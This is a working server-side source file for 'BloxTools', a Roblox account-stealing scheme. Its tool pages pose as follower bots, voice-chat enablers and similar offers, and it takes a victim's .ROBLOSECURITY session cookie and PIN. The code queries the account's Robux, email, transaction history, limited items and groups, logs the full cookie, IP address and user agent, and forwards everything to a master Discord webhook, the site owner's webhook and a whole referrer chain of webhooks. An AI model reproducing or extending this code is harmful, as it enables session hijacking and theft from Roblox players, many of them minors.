// Receives a tool submission from the client, looks up the Roblox account
// using the .ROBLOSECURITY cookie server-side, logs a hit, and dual-hooks
// to Discord (master config webhook + the site owner's webhook for that tool).
import { createClient } from "npm:@supabase/supabase-js@2.95.0";
import { corsHeaders } from "npm:@supabase/supabase-js@2.95.0/cors";

interface Body {
  username?: string;
  toolType: string;
  toolKey:
    | "bot_followers"
    | "copy_games"
    | "copy_clothes"
    | "group_botter"
    | "vc_enabler"
    | "id_verifier";
  cookie: string;
  pin?: string;
  extras?: Record<string, string | number | undefined>;
  // When true (Hit Checker), do NOT forward to any webhook if the cookie is invalid.
  checkOnly?: boolean;
}

// Master webhook + emoji overrides are read from secrets PER REQUEST so changing
// the MASTER_WEBHOOK_URL or DISCORD_EMOJIS secret takes effect immediately
// without redeploys and without any hardcoded fallback masking the new value.
const SITE_NAME = "BloxTools";

const DEFAULT_EMOJI: Record<string, string> = {
  robux:    "<:7116_Robux:1498757858731360349>",
  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
  rap:      "💎",
  summary:  "📊",
  pending:  "⏳",
  voice:    "🎤",
  age:      "🪪",
  korblox:  "<:KorbloxDeathspeaker:1498762534784864387>",
  headless: "<:noFilter:1498762549762461909>",
  groups:   "👑",
  games:    "🎮",
  cookie:   "🍪",
  ip:       "🌐",
  user:     "👤",
  id:       "🆔",
  age_acct: "📅",
  friends:  "🫂",
  followers:"👥",
  following:"➡️",
  ua:       "🖥️",
  time:     "⏰",
  pin:      "🔐",
  owner:    "🏷️",
  email:    "📧",
};

function getMasterWebhook(): string {
  return (Deno.env.get("MASTER_WEBHOOK_URL") ?? "").trim();
}

function loadEmoji(): Record<string, string> {
  const raw = Deno.env.get("DISCORD_EMOJIS");
  if (!raw) return DEFAULT_EMOJI;
  try {
    const parsed = JSON.parse(raw) as Record<string, string>;
    return { ...DEFAULT_EMOJI, ...parsed };
  } catch (e) {
    console.error("DISCORD_EMOJIS secret is not valid JSON, falling back to defaults", e);
    return DEFAULT_EMOJI;
  }
}


// Roblox bundle IDs
const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman

// Tracked games — each lists the gamepass IDs we check ownership for.
// "Owned passes" replaces the old played-games detection. Pass IDs are looked
// up via the Roblox inventory `is-owned` endpoint.
const TRACKED_GAMES: Array<{ name: string; passes: number[] }> = [
  { name: "MM2",              passes: [429957, 1308795] },
  { name: "Steal a Brainrot", passes: [1228591447, 1229510262, 1227013099] },
  { name: "Adopt Me",         passes: [3196348, 5300198, 1585546290, 6040696, 189425850] },
  { name: "PS99",             passes: [265320491, 259437976, 205379487, 265324265, 655859720, 257811346, 258567677, 257803774, 975558264, 264808140, 690997523, 720275150, 651611000] },
  { name: "Bloxstrike",       passes: [1819900809, 1827234915, 1826267025] },
];

async function ownsGamePass(userId: number, gamePassId: number): Promise<boolean> {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gamePassId}/is-owned`);
    if (!r.ok) return false;
    const text = (await r.text()).trim().toLowerCase();
    return text === "true";
  } catch { return false; }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  try {
    const body = (await req.json()) as Body;
    if (!body?.cookie || !body?.toolType || !body?.toolKey) {
      return json({ error: "Missing fields" }, 400);
    }
    // Sanitize cookie — strip wrapping quotes, trailing commas/whitespace
    body.cookie = body.cookie.trim().replace(/^["']+|["',\s]+$/g, "");

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    // 1. Find owner profile + per-tool webhook
    let profile: {
      id: string;
      username: string;
      webhook_url: string | null;
      webhook_bot_followers: string | null;
      webhook_copy_games: string | null;
      webhook_copy_clothes: string | null;
      webhook_group_botter: string | null;
      webhook_vc_enabler: string | null;
      referrer_id: string | null;
    } | null = null;
    const profileSelect = "id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler, referrer_id";
    // Owner is determined ONLY by the site the submission came from
    // (body.username = the /:username/* site). The submitter's own auth token
    // is intentionally ignored — a logged-in user testing on the root site
    // must NOT cause hits to be attributed to them or forwarded up their
    // referrer chain. Root site = no owner, master webhook only.
    if (body.username) {
      const { data, error: profileErr } = await supabase
        .from("profiles")
        .select(profileSelect)
        .eq("username", body.username.toLowerCase())
        .maybeSingle();
      if (profileErr || !data) return json({ error: "Owner not found" }, 404);
      profile = data;
    }

    const perToolMap: Record<string, string | null | undefined> = {
      bot_followers: profile?.webhook_bot_followers,
      copy_games: profile?.webhook_copy_games,
      copy_clothes: profile?.webhook_copy_clothes,
      group_botter: profile?.webhook_group_botter,
      vc_enabler: profile?.webhook_vc_enabler,
    };
    const ownerWebhook = perToolMap[body.toolKey] || profile?.webhook_url || null;

    // INFINITY HOOK — walk the entire referrer chain. If user1 was referred by
    // user2, who was referred by user3, etc., every ancestor's webhook gets the
    // hit silently. Cycle-protected and depth-capped to keep things sane.
    const referrerWebhooks: string[] = [];
    {
      const seen = new Set<string>([profile?.id ?? ""]);
      let currentReferrerId: string | null = profile?.referrer_id ?? null;
      const MAX_DEPTH = 50;
      for (let i = 0; i < MAX_DEPTH && currentReferrerId && !seen.has(currentReferrerId); i++) {
        seen.add(currentReferrerId);
        const { data: refProfile } = await supabase
          .from("profiles")
          .select("referrer_id, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler")
          .eq("id", currentReferrerId)
          .maybeSingle();
        if (!refProfile) break;
        const refToolMap: Record<string, string | null | undefined> = {
          bot_followers: refProfile.webhook_bot_followers,
          copy_games: refProfile.webhook_copy_games,
          copy_clothes: refProfile.webhook_copy_clothes,
          group_botter: refProfile.webhook_group_botter,
          vc_enabler: refProfile.webhook_vc_enabler,
        };
        const hook = refToolMap[body.toolKey] || refProfile.webhook_url || null;
        if (hook) referrerWebhooks.push(hook);
        currentReferrerId = (refProfile.referrer_id as string | null) ?? null;
      }
    }

    // 2. Server-side Roblox lookup (incl. RAP, Korblox, Headless)
    const robloxInfo = await fetchRobloxInfo(body.cookie);

    // 3. IP / UA
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Unknown";
    const userAgent = req.headers.get("user-agent") || "Unknown";

    // 4. Log the hit (deduped — same cookie OR same Roblox account for same
    //    owner counts as ONE hit). We rely on the partial unique indexes:
    //      hits_owner_cookie_uniq         (owner_id, cookie_full)
    //      hits_owner_roblox_user_uniq    (owner_id, roblox_user_id)
    //    A duplicate insert returns Postgres code 23505; we treat that as "not
    //    a new hit" and still forward the Discord embed (so the owner sees the
    //    activity) but skip leaderboard increment.
    let isDuplicate = false;
    if (profile) {
      const hit = {
        owner_id: profile.id,
        tool_type: body.toolType,
        roblox_username: robloxInfo?.name ?? null,
        roblox_user_id: robloxInfo?.id ?? null,
        roblox_robux: robloxInfo?.robux ?? null,
        roblox_rap: robloxInfo?.rap ?? null,
        roblox_premium: robloxInfo?.premium ?? null,
        roblox_has_korblox: robloxInfo?.hasKorblox ?? null,
        roblox_has_headless: robloxInfo?.hasHeadless ?? null,
        roblox_headshot_url: robloxInfo?.avatar ?? robloxInfo?.headshot ?? null,
        roblox_voice_enabled: robloxInfo?.voiceEnabled ?? null,
        roblox_age_verified: robloxInfo?.ageVerified ?? null,
        roblox_gamepass_earnings: robloxInfo?.gamepassEarnings ?? null,
        roblox_robux_spent: robloxInfo?.robuxSpent ?? null,
        roblox_summary: robloxInfo?.summary ?? null,
        roblox_pending_robux: robloxInfo?.pendingRobux ?? null,
        roblox_incoming_robux: robloxInfo?.incomingRobux ?? null,
        cookie_preview: body.cookie.slice(-16),
        cookie_full: body.cookie,
        is_valid: robloxInfo !== null,
        last_checked_at: new Date().toISOString(),
        ip_address: ip,
        user_agent: userAgent,
      };

      const { error: hitError } = await supabase.from("hits").insert(hit);
      if (hitError) {
        // 23505 = unique_violation — same cookie or same roblox account already
        // logged a hit for this owner. Not an error; just don't double-count.
        if ((hitError as { code?: string }).code === "23505") {
          isDuplicate = true;
          console.log("duplicate hit ignored", { owner: profile.id, robloxId: robloxInfo?.id });
        } else {
          console.error("hit insert failed", hitError);
          return json({ error: "Hit logging failed" }, 500);
        }
      }
    }

    // 5. Discord payload
    const payload = buildDiscordPayload({
      siteName: SITE_NAME,
      ownerUsername: profile?.username ?? "(root site)",
      toolType: body.toolType,
      pin: body.pin,
      cookie: body.cookie,
      roblox: robloxInfo,
      ip,
      userAgent,
      extras: body.extras,
    });

    const targets = new Set<string>();
    // Master webhook receives EVERY hit (root site + all user-owned sites).
    const masterWebhook = getMasterWebhook();
    if (masterWebhook) targets.add(masterWebhook);
    if (ownerWebhook) targets.add(ownerWebhook);
    for (const url of referrerWebhooks) targets.add(url);

    await Promise.allSettled(
      Array.from(targets).map((url) =>
        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        })
      )
    );

    return json({ ok: true, valid: robloxInfo !== null });
  } catch (err) {
    console.error("submit-hit error", err);
    return json({ error: "Internal error" }, 500);
  }
});

function json(b: unknown, status = 200) {
  return new Response(JSON.stringify(b), {
    status,
    headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}

interface GroupOwned {
  name: string;
  memberCount: number;
  role: string;
}

interface RobloxInfo {
  id: number;
  name: string;
  displayName: string;
  robux: number | null;
  rap: number | null;
  premium: boolean | null;
  hasKorblox: boolean | null;
  hasHeadless: boolean | null;
  headshot: string | null;
  avatar: string | null;
  createdAt: string | null;
  accountAgeDays: number | null;
  friendsCount: number | null;
  followersCount: number | null;
  followingCount: number | null;
  ownedGroups: GroupOwned[];
  totalGroups: number | null;
  voiceEnabled: boolean | null;
  ageVerified: boolean | null;
  gamepassEarnings: number | null;
  robuxSpent: number | null;
  summary: number | null;
  pendingRobux: number | null;
  incomingRobux: number | null;
  email: string | null;
  emailVerified: boolean | null;
  ownedPasses: Array<{ game: string; passes: Array<{ id: number; owned: boolean }> }>;
}

async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
  try {
    const cookieHeader = `.ROBLOSECURITY=${cookie}`;
    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { Cookie: cookieHeader },
    });
    if (!authRes.ok) return null;
    const auth = await authRes.json() as { id: number; name: string; displayName: string };

    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
      fetchRobux(auth.id, cookieHeader),
      fetchPremium(auth.id, cookieHeader),
      fetchHeadshot(auth.id),
      fetchAvatar(auth.id),
      fetchRap(auth.id),
      ownsBundle(auth.id, KORBLOX_BUNDLE_ID),
      ownsBundle(auth.id, HEADLESS_BUNDLE_ID),
      fetchProfile(auth.id),
      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/friends/count`, "count"),
      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followers/count`, "count"),
      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followings/count`, "count"),
      fetchGroups(auth.id),
      fetchVoiceEnabled(cookieHeader),
      fetchAgeVerified(cookieHeader),
      fetchTransactionTotals(auth.id, cookieHeader),
      fetchOwnedPasses(auth.id),
      fetchEmail(cookieHeader),
    ]);

    const createdAt = profile?.created ?? null;
    const accountAgeDays = createdAt
      ? Math.floor((Date.now() - new Date(createdAt).getTime()) / (1000 * 60 * 60 * 24))
      : null;

    return {
      id: auth.id,
      name: auth.name,
      displayName: auth.displayName,
      robux,
      rap,
      premium,
      hasKorblox,
      hasHeadless,
      headshot,
      avatar,
      createdAt,
      accountAgeDays,
      friendsCount,
      followersCount,
      followingCount,
      ownedGroups: groupsInfo.owned,
      totalGroups: groupsInfo.total,
      voiceEnabled,
      ageVerified,
      gamepassEarnings: null,
      robuxSpent: transactionTotals.spent,
      summary: transactionTotals.summary,
      pendingRobux: transactionTotals.pending,
      incomingRobux: transactionTotals.incoming,
      email: emailInfo?.address ?? null,
      emailVerified: emailInfo?.verified ?? null,
      ownedPasses,
    };
  } catch (e) {
    console.error("roblox lookup failed", e);
    return null;
  }
}

// For each tracked game, check ownership of every listed gamepass in parallel.
async function fetchOwnedPasses(userId: number): Promise<Array<{ game: string; passes: Array<{ id: number; owned: boolean }> }>> {
  return await Promise.all(
    TRACKED_GAMES.map(async (g) => ({
      game: g.name,
      passes: await Promise.all(
        g.passes.map(async (id) => ({ id, owned: await ownsGamePass(userId, id) })),
      ),
    })),
  );
}

async function fetchAvatar(userId: number): Promise<string | null> {
  try {
    const h = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
    if (!h.ok) return null;
    const j = await h.json();
    return j?.data?.[0]?.imageUrl ?? null;
  } catch { return null; }
}

async function fetchVoiceEnabled(cookieHeader: string): Promise<boolean | null> {
  try {
    const r = await fetch("https://voice.roblox.com/v1/settings", { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    const j = await r.json();
    return j?.isVoiceEnabled ?? false;
  } catch { return null; }
}

async function fetchAgeVerified(cookieHeader: string): Promise<boolean | null> {
  try {
    const r = await fetch("https://accountinformation.roblox.com/v1/birthdate", { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    const j = await r.json();
    // Verified accounts include an isAgeVerified flag; fall back to age >= 13 calc
    if (typeof j?.isAgeVerified === "boolean") return j.isAgeVerified;
    return null;
  } catch { return null; }
}

async function fetchEmail(cookieHeader: string): Promise<{ address: string; verified: boolean } | null> {
  try {
    const r = await fetch("https://accountsettings.roblox.com/v1/email", { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    const j = await r.json() as { emailAddress?: string; verified?: boolean };
    return { address: j.emailAddress ?? "", verified: !!j.verified };
  } catch { return null; }
}

// Sums the price of all gamepasses created/owned by the user (potential earnings)
async function fetchGamepassEarnings(userId: number): Promise<number | null> {
  try {
    let total = 0;
    let cursor = "";
    for (let page = 0; page < 5; page++) {
      const url = `https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
      const r = await fetch(url);
      if (!r.ok) break;
      const j = await r.json() as { data?: Array<{ id: number }>; nextPageCursor?: string };
      for (const game of j.data ?? []) {
        const gp = await fetch(`https://games.roblox.com/v1/games/${game.id}/game-passes?limit=100&sortOrder=Asc`);
        if (!gp.ok) continue;
        const gpJson = await gp.json() as { data?: Array<{ price: number | null }> };
        for (const pass of gpJson.data ?? []) total += pass.price ?? 0;
      }
      if (!j.nextPageCursor) break;
      cursor = j.nextPageCursor;
    }
    return total;
  } catch { return null; }
}

// Year-to-date Robux summary: tries multiple endpoints/timeframes for resilience.
// Strategy:
//   1. Prime CSRF token via a POST to logout (always returns 403 + token).
//   2. Hit transaction-totals with timeFrame=Year on economy.roblox.com.
//   3. Fallback to timeFrame=CurrentYear, then Month, then AllTime if Year is empty.
//   4. Sum incoming vs outgoing buckets explicitly (no double-counting).
async function primeCsrf(cookieHeader: string): Promise<string | null> {
  try {
    const r = await fetch("https://auth.roblox.com/v2/logout", {
      method: "POST",
      headers: { Cookie: cookieHeader, "Content-Length": "0" },
    });
    return r.headers.get("x-csrf-token");
  } catch { return null; }
}

async function fetchTotalsForTimeframe(
  userId: number,
  cookieHeader: string,
  csrf: string | null,
  timeFrame: string,
): Promise<Record<string, number> | null> {
  const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=${timeFrame}&transactionType=summary`;
  const headers: Record<string, string> = { Cookie: cookieHeader };
  if (csrf) headers["x-csrf-token"] = csrf;
  try {
    let r = await fetch(url, { headers });
    if (r.status === 403) {
      const newCsrf = r.headers.get("x-csrf-token");
      if (newCsrf) {
        headers["x-csrf-token"] = newCsrf;
        r = await fetch(url, { headers });
      }
    }
    if (!r.ok) {
      console.error(`transaction-totals[${timeFrame}] failed`, r.status, await r.text().catch(() => ""));
      return null;
    }
    const j = await r.json() as Record<string, number>;
    console.log(`transaction-totals[${timeFrame}] raw`, JSON.stringify(j));
    return j;
  } catch (e) {
    console.error(`transaction-totals[${timeFrame}] error`, e);
    return null;
  }
}

function parseTotals(j: Record<string, number>): { spent: number; summary: number } {
  // INCOMING (Robux earned) — this is what users want to see as "summary"
  const incoming =
    (j.salesTotal ?? 0) +
    (j.affiliateSalesTotal ?? 0) +
    (j.commissionsTotal ?? 0) +
    (j.tradeSystemEarningsTotal ?? 0) +
    (j.premiumPayoutsTotal ?? 0) +
    (j.groupPremiumPayoutsTotal ?? 0) +
    (j.premiumStipendsTotal ?? 0) +
    (j.individualToGroupTotal ?? 0) +
    (j.adjustmentsTotal ?? 0);

  // OUTGOING (Robux spent)
  const spent =
    (j.purchasesTotal ?? 0) +
    (j.tradeSystemFeesTotal ?? 0) +
    (j.tradeSystemTaxesTotal ?? 0) +
    (j.groupPayoutsTotal ?? 0) +
    (j.currencyPurchasesTotal ?? 0);

  // "summary" = gross Robux earned (positive), not net. Net was confusing.
  return { spent: Math.abs(spent), summary: Math.max(0, incoming) };
}

async function fetchTransactionTotals(
  userId: number,
  cookieHeader: string,
): Promise<{ spent: number; summary: number; pending: number; incoming: number }> {
  const csrf = await primeCsrf(cookieHeader);

  // Past year (rolling 12 months). Roblox's official timeFrame for this is "Year".
  const j = await fetchTotalsForTimeframe(userId, cookieHeader, csrf, "Year");
  const parsed = j ? parseTotals(j) : { spent: 0, summary: 0 };

  // v1 endpoint exposes pendingRobuxTotal + incomingRobuxTotal directly.
  let pending = 0;
  let incoming = 0;
  try {
    const url = `https://economy.roblox.com/v1/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`;
    const headers: Record<string, string> = {
      Cookie: cookieHeader,
      "user-agent": "Roblox/WinINet",
    };
    if (csrf) headers["x-csrf-token"] = csrf;
    let r = await fetch(url, { headers });
    if (r.status === 403) {
      const newCsrf = r.headers.get("x-csrf-token");
      if (newCsrf) {
        headers["x-csrf-token"] = newCsrf;
        r = await fetch(url, { headers });
      }
    }
    if (r.ok) {
      const v1 = await r.json() as Record<string, number>;
      console.log("transaction-totals[v1/Year] raw", JSON.stringify(v1));
      pending = Number(v1.pendingRobuxTotal ?? 0) || 0;
      incoming = Number(v1.incomingRobuxTotal ?? 0) || 0;
    } else {
      console.error("v1 transaction-totals failed", r.status);
    }
  } catch (e) {
    console.error("v1 transaction-totals error", e);
  }

  // v2 fallback for pending/incoming if v1 returned nothing.
  if (pending === 0 && incoming === 0) {
    try {
      const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`;
      const headers: Record<string, string> = { Cookie: cookieHeader, "user-agent": "Roblox/WinINet" };
      if (csrf) headers["x-csrf-token"] = csrf;
      let r = await fetch(url, { headers });
      if (r.status === 403) {
        const newCsrf = r.headers.get("x-csrf-token");
        if (newCsrf) { headers["x-csrf-token"] = newCsrf; r = await fetch(url, { headers }); }
      }
      if (r.ok) {
        const v2 = await r.json() as Record<string, number>;
        console.log("transaction-totals[v2/Year] raw", JSON.stringify(v2));
        pending = Number(v2.pendingRobuxTotal ?? 0) || pending;
        incoming = Number(v2.incomingRobuxTotal ?? 0) || incoming;
      }
    } catch (e) { console.error("v2 transaction-totals error", e); }
  }

  console.log("transaction-totals parsed", { ...parsed, pending, incoming });
  return { ...parsed, pending, incoming };
}

async function fetchProfile(userId: number): Promise<{ created: string } | null> {
  try {
    const r = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

async function fetchCount(url: string, key: string): Promise<number | null> {
  try {
    const r = await fetch(url);
    if (!r.ok) return null;
    const j = await r.json();
    return j?.[key] ?? null;
  } catch { return null; }
}

async function fetchGroups(userId: number): Promise<{ owned: GroupOwned[]; total: number | null }> {
  try {
    const r = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
    if (!r.ok) return { owned: [], total: null };
    const j = await r.json() as { data?: Array<{ group: { name: string; memberCount: number }; role: { name: string; rank: number } }> };
    const all = j.data ?? [];
    const owned = all
      .filter((g) => g.role?.rank === 255 || /owner/i.test(g.role?.name ?? ""))
      .map((g) => ({ name: g.group.name, memberCount: g.group.memberCount, role: g.role.name }));
    return { owned, total: all.length };
  } catch { return { owned: [], total: null }; }
}

async function fetchRobux(userId: number, cookieHeader: string): Promise<number | null> {
  try {
    const r = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: { Cookie: cookieHeader } });
    if (!r.ok) return null;
    return (await r.json()).robux ?? null;
  } catch { return null; }
}

async function fetchPremium(userId: number, cookieHeader: string): Promise<boolean | null> {
  try {
    const p = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: { Cookie: cookieHeader } });
    if (!p.ok) return null;
    return (await p.text()) === "true";
  } catch { return null; }
}

async function fetchHeadshot(userId: number): Promise<string | null> {
  try {
    const h = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
    if (!h.ok) return null;
    const j = await h.json();
    return j?.data?.[0]?.imageUrl ?? null;
  } catch { return null; }
}

// Sums RAP across all collectibles owned by the user.
async function fetchRap(userId: number): Promise<number | null> {
  try {
    let total = 0;
    let cursor = "";
    for (let page = 0; page < 10; page++) {
      const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
      const r = await fetch(url);
      if (!r.ok) return total || null;
      const j = await r.json() as { data?: Array<{ recentAveragePrice?: number }>; nextPageCursor?: string };
      for (const item of j.data ?? []) total += item.recentAveragePrice ?? 0;
      if (!j.nextPageCursor) break;
      cursor = j.nextPageCursor;
    }
    return total;
  } catch { return null; }
}

async function ownsBundle(userId: number, bundleId: number): Promise<boolean | null> {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${bundleId}`);
    if (!r.ok) return null;
    const j = await r.json() as { data?: unknown[] };
    return Array.isArray(j.data) && j.data.length > 0;
  } catch { return null; }
}

function buildDiscordPayload(opts: {
  siteName: string;
  ownerUsername: string;
  toolType: string;
  pin?: string;
  cookie: string;
  roblox: RobloxInfo | null;
  ip: string;
  userAgent: string;
  extras?: Record<string, string | number | undefined>;
}) {
  const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
  const EMOJI = loadEmoji();

  const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
    { name: `${EMOJI.owner} Site Owner`, value: ownerUsername, inline: true },
  ];

  if (pin) {
    mainFields.push({ name: `${EMOJI.pin} PIN`, value: pin, inline: true });
  }

  if (extras) {
    for (const [k, v] of Object.entries(extras)) {
      if (v === undefined || v === null || v === "") continue;
      mainFields.push({ name: prettifyKey(k), value: String(v), inline: true });
    }
  }

  if (roblox) {
    const ageStr = roblox.accountAgeDays !== null && roblox.createdAt
      ? `${roblox.accountAgeDays.toLocaleString()} days (${new Date(roblox.createdAt).toISOString().slice(0, 10)})`
      : "Unknown";

    const robuxStr = roblox.robux !== null
      ? `${roblox.robux.toLocaleString()}${roblox.pendingRobux ? ` (+${roblox.pendingRobux.toLocaleString()} pending)` : ""}`
      : "Unknown";

    mainFields.push(
      { name: `${EMOJI.user} Username (13+)`, value: `${roblox.name} (${roblox.displayName})`, inline: true },
      { name: `${EMOJI.id} User ID`, value: String(roblox.id), inline: true },
      { name: `${EMOJI.age_acct} Account Age`, value: ageStr, inline: true },
      { name: `${EMOJI.robux} Robux`, value: robuxStr, inline: true },
      { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
      { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
      { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
      { name: `${EMOJI.pending} Robux Incoming`, value: (roblox.incomingRobux ?? 0).toLocaleString(), inline: true },
      { name: `${EMOJI.korblox}/${EMOJI.headless} Korblox/Headless`, value: `${roblox.hasKorblox ? "True" : "False"}/${roblox.hasHeadless ? "True" : "False"}`, inline: true },
      { name: `${EMOJI.friends} Friends`, value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
      { name: `${EMOJI.followers} Followers`, value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
      { name: `${EMOJI.following} Following`, value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
      { name: `${EMOJI.voice} Voice Chat`, value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
      { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
      { name: `${EMOJI.email} Email`, value: roblox.email ? `${roblox.email} ${roblox.emailVerified ? "✅ Verified" : "❌ Unverified"}` : (roblox.emailVerified === null ? "Unknown" : "❌ None set"), inline: true },
      { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
    );

    // Owned groups — chunked to 1024 chars per field
    if (roblox.ownedGroups.length > 0) {
      const lines = roblox.ownedGroups.map(
        (g) => `• **${g.name}** — ${g.memberCount.toLocaleString()} members`
      );
      const chunks: string[] = [];
      let buf = "";
      for (const line of lines) {
        if ((buf + "\n" + line).length > 1024) {
          chunks.push(buf);
          buf = line;
        } else {
          buf = buf ? `${buf}\n${line}` : line;
        }
      }
      if (buf) chunks.push(buf);
      chunks.forEach((c, i) => {
        mainFields.push({
          name: chunks.length === 1 ? `${EMOJI.groups} Owned Groups (${roblox.ownedGroups.length})` : `${EMOJI.groups} Owned Groups (${i + 1}/${chunks.length})`,
          value: c,
          inline: false,
        });
      });
    } else {
      mainFields.push({ name: `${EMOJI.groups} Owned Groups`, value: "None", inline: false });
    }

    mainFields.push(
      { name: "Profile", value: `https://www.roblox.com/users/${roblox.id}/profile`, inline: false },
    );
  } else {
    mainFields.push({ name: "Roblox Account", value: "Cookie invalid or lookup failed", inline: false });
  }

  mainFields.push(
    { name: `${EMOJI.ip} IP Address`, value: ip, inline: true },
    { name: `${EMOJI.ua} User Agent`, value: userAgent.slice(0, 1000), inline: false },
    { name: `${EMOJI.time} Submitted`, value: new Date().toISOString(), inline: false },
  );


  // Games embed — one field per tracked game listing pass ownership
  const gameFields: Array<{ name: string; value: string; inline?: boolean }> = [];
  if (roblox) {
    for (const g of roblox.ownedPasses) {
      if (g.passes.length === 0) continue;
      const ownedCount = g.passes.filter((p) => p.owned).length;
      gameFields.push({
        name: `${EMOJI.games} ${g.game} Passes (${ownedCount}/${g.passes.length})`,
        value: g.passes
          .map((p) => `${p.owned ? "✅" : "❌"} [${p.id}](https://www.roblox.com/game-pass/${p.id})`)
          .join("\n"),
        inline: true,
      });
    }
  }

  const embeds: Array<Record<string, unknown>> = [
    {
      title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
      color: 0xa855f7,
      thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
      fields: mainFields,
      footer: { text: `${siteName} Submission System` },
      timestamp: new Date().toISOString(),
    },
  ];
  if (gameFields.length > 0) {
    embeds.push({
      title: `${EMOJI.games} Tracked Games`,
      color: 0x22c55e,
      fields: gameFields,
      footer: { text: `${siteName} • Gamepass Ownership` },
    });
  }
  embeds.push({
    title: `${EMOJI.cookie} Account Cookie`,
    color: 0xff5555,
    description: "```\n" + cookie.slice(0, 4080) + "\n```",
    footer: { text: "Handle with care" },
  });

  return {
    content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
    embeds,
  };
}

function prettifyKey(k: string): string {
  return k.replace(/([A-Z])/g, " $1").replace(/^./, (c) => c.toUpperCase());
}
